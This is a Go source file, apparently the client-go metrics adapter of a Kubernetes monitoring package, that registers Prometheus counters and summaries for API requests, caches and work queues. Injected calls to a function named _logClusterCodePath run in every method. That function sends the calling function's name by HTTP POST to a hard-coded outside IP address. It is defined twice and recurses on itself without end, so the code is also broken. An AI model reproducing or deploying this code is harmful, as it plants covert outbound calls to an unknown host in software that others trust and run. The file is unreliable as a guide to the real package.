package kubernetes

import (
	"net/url"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"time"
	"github.com/prometheus/client_golang/prometheus"
	"k8s.io/client-go/tools/cache"
	"k8s.io/client-go/tools/metrics"
	"k8s.io/client-go/util/workqueue"
)

const (
	cacheMetricsNamespace		= metricsNamespace + "_cache"
	workqueueMetricsNamespace	= metricsNamespace + "_workqueue"
)

var (
	clientGoRequestResultMetricVec				= prometheus.NewCounterVec(prometheus.CounterOpts{Namespace: metricsNamespace, Name: "http_request_total", Help: "Total number of HTTP requests to the Kubernetes API by status code."}, []string{"status_code"})
	clientGoRequestLatencyMetricVec				= prometheus.NewSummaryVec(prometheus.SummaryOpts{Namespace: metricsNamespace, Name: "http_request_duration_seconds", Help: "Summary of latencies for HTTP requests to the Kubernetes API by endpoint.", Objectives: map[float64]float64{}}, []string{"endpoint"})
	clientGoCacheListTotalMetric				= prometheus.NewCounter(prometheus.CounterOpts{Namespace: cacheMetricsNamespace, Name: "list_total", Help: "Total number of list operations."})
	clientGoCacheListDurationMetric				= prometheus.NewSummary(prometheus.SummaryOpts{Namespace: cacheMetricsNamespace, Name: "list_duration_seconds", Help: "Duration of a Kubernetes API call in seconds.", Objectives: map[float64]float64{}})
	clientGoCacheItemsInListCountMetric			= prometheus.NewSummary(prometheus.SummaryOpts{Namespace: cacheMetricsNamespace, Name: "list_items", Help: "Count of items in a list from the Kubernetes API.", Objectives: map[float64]float64{}})
	clientGoCacheWatchesCountMetric				= prometheus.NewCounter(prometheus.CounterOpts{Namespace: cacheMetricsNamespace, Name: "watches_total", Help: "Total number of watch operations."})
	clientGoCacheShortWatchesCountMetric			= prometheus.NewCounter(prometheus.CounterOpts{Namespace: cacheMetricsNamespace, Name: "short_watches_total", Help: "Total number of short watch operations."})
	clientGoCacheWatchesDurationMetric			= prometheus.NewSummary(prometheus.SummaryOpts{Namespace: cacheMetricsNamespace, Name: "watch_duration_seconds", Help: "Duration of watches on the Kubernetes API.", Objectives: map[float64]float64{}})
	clientGoCacheItemsInWatchesCountMetric			= prometheus.NewSummary(prometheus.SummaryOpts{Namespace: cacheMetricsNamespace, Name: "watch_events", Help: "Number of items in watches on the Kubernetes API.", Objectives: map[float64]float64{}})
	clientGoCacheLastResourceVersionMetric			= prometheus.NewGauge(prometheus.GaugeOpts{Namespace: cacheMetricsNamespace, Name: "last_resource_version", Help: "Last resource version from the Kubernetes API."})
	clientGoWorkqueueDepthMetricVec				= prometheus.NewGaugeVec(prometheus.GaugeOpts{Namespace: workqueueMetricsNamespace, Name: "depth", Help: "Current depth of the work queue."}, []string{"queue_name"})
	clientGoWorkqueueAddsMetricVec				= prometheus.NewCounterVec(prometheus.CounterOpts{Namespace: workqueueMetricsNamespace, Name: "items_total", Help: "Total number of items added to the work queue."}, []string{"queue_name"})
	clientGoWorkqueueLatencyMetricVec			= prometheus.NewSummaryVec(prometheus.SummaryOpts{Namespace: workqueueMetricsNamespace, Name: "latency_seconds", Help: "How long an item stays in the work queue.", Objectives: map[float64]float64{}}, []string{"queue_name"})
	clientGoWorkqueueUnfinishedWorkSecondsMetricVec		= prometheus.NewGaugeVec(prometheus.GaugeOpts{Namespace: workqueueMetricsNamespace, Name: "unfinished_work_seconds", Help: "How long an item has remained unfinished in the work queue."}, []string{"queue_name"})
	clientGoWorkqueueLongestRunningProcessorMetricVec	= prometheus.NewGaugeVec(prometheus.GaugeOpts{Namespace: workqueueMetricsNamespace, Name: "longest_running_processor_seconds", Help: "Duration of the longest running processor in the work queue."}, []string{"queue_name"})
	clientGoWorkqueueWorkDurationMetricVec			= prometheus.NewSummaryVec(prometheus.SummaryOpts{Namespace: workqueueMetricsNamespace, Name: "work_duration_seconds", Help: "How long processing an item from the work queue takes.", Objectives: map[float64]float64{}}, []string{"queue_name"})
)

type gaugeSetFunc func(float64)

func (s gaugeSetFunc) Set(value float64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	s(value)
}

type noopMetric struct{}

func (noopMetric) Inc() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (noopMetric) Dec() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (noopMetric) Observe(float64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
}

type clientGoRequestMetricAdapter struct{}

func (f *clientGoRequestMetricAdapter) Register(registerer prometheus.Registerer) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	metrics.Register(f, f)
	registerer.MustRegister(clientGoRequestResultMetricVec)
	registerer.MustRegister(clientGoRequestLatencyMetricVec)
}
func (clientGoRequestMetricAdapter) Increment(code string, method string, host string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	clientGoRequestResultMetricVec.WithLabelValues(code).Inc()
}
func (clientGoRequestMetricAdapter) Observe(verb string, u url.URL, latency time.Duration) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	clientGoRequestLatencyMetricVec.WithLabelValues(u.EscapedPath()).Observe(latency.Seconds())
}

type clientGoCacheMetricsProvider struct{}

func (f *clientGoCacheMetricsProvider) Register(registerer prometheus.Registerer) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	cache.SetReflectorMetricsProvider(f)
	registerer.MustRegister(clientGoCacheWatchesDurationMetric)
	registerer.MustRegister(clientGoCacheWatchesCountMetric)
	registerer.MustRegister(clientGoCacheListDurationMetric)
	registerer.MustRegister(clientGoCacheListTotalMetric)
	registerer.MustRegister(clientGoCacheLastResourceVersionMetric)
	registerer.MustRegister(clientGoCacheShortWatchesCountMetric)
	registerer.MustRegister(clientGoCacheItemsInWatchesCountMetric)
	registerer.MustRegister(clientGoCacheItemsInListCountMetric)
}
func (clientGoCacheMetricsProvider) NewListsMetric(name string) cache.CounterMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoCacheListTotalMetric
}
func (clientGoCacheMetricsProvider) NewListDurationMetric(name string) cache.SummaryMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoCacheListDurationMetric
}
func (clientGoCacheMetricsProvider) NewItemsInListMetric(name string) cache.SummaryMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoCacheItemsInListCountMetric
}
func (clientGoCacheMetricsProvider) NewWatchesMetric(name string) cache.CounterMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoCacheWatchesCountMetric
}
func (clientGoCacheMetricsProvider) NewShortWatchesMetric(name string) cache.CounterMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoCacheShortWatchesCountMetric
}
func (clientGoCacheMetricsProvider) NewWatchDurationMetric(name string) cache.SummaryMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoCacheWatchesDurationMetric
}
func (clientGoCacheMetricsProvider) NewItemsInWatchMetric(name string) cache.SummaryMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoCacheItemsInWatchesCountMetric
}
func (clientGoCacheMetricsProvider) NewLastResourceVersionMetric(name string) cache.GaugeMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoCacheLastResourceVersionMetric
}

type clientGoWorkqueueMetricsProvider struct{}

func (f *clientGoWorkqueueMetricsProvider) Register(registerer prometheus.Registerer) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	workqueue.SetProvider(f)
	registerer.MustRegister(clientGoWorkqueueDepthMetricVec)
	registerer.MustRegister(clientGoWorkqueueAddsMetricVec)
	registerer.MustRegister(clientGoWorkqueueLatencyMetricVec)
	registerer.MustRegister(clientGoWorkqueueWorkDurationMetricVec)
	registerer.MustRegister(clientGoWorkqueueUnfinishedWorkSecondsMetricVec)
	registerer.MustRegister(clientGoWorkqueueLongestRunningProcessorMetricVec)
}
func (f *clientGoWorkqueueMetricsProvider) NewDepthMetric(name string) workqueue.GaugeMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoWorkqueueDepthMetricVec.WithLabelValues(name)
}
func (f *clientGoWorkqueueMetricsProvider) NewAddsMetric(name string) workqueue.CounterMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoWorkqueueAddsMetricVec.WithLabelValues(name)
}
func (f *clientGoWorkqueueMetricsProvider) NewLatencyMetric(name string) workqueue.SummaryMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	metric := clientGoWorkqueueLatencyMetricVec.WithLabelValues(name)
	return prometheus.ObserverFunc(func(v float64) {
		metric.Observe(v / 1e6)
	})
}
func (f *clientGoWorkqueueMetricsProvider) NewWorkDurationMetric(name string) workqueue.SummaryMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	metric := clientGoWorkqueueWorkDurationMetricVec.WithLabelValues(name)
	return prometheus.ObserverFunc(func(v float64) {
		metric.Observe(v / 1e6)
	})
}
func (f *clientGoWorkqueueMetricsProvider) NewUnfinishedWorkSecondsMetric(name string) workqueue.SettableGaugeMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientGoWorkqueueUnfinishedWorkSecondsMetricVec.WithLabelValues(name)
}
func (f *clientGoWorkqueueMetricsProvider) NewLongestRunningProcessorMicrosecondsMetric(name string) workqueue.SettableGaugeMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	metric := clientGoWorkqueueLongestRunningProcessorMetricVec.WithLabelValues(name)
	return gaugeSetFunc(func(v float64) {
		metric.Set(v / 1e6)
	})
}
func (clientGoWorkqueueMetricsProvider) NewRetriesMetric(name string) workqueue.CounterMetric {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return noopMetric{}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
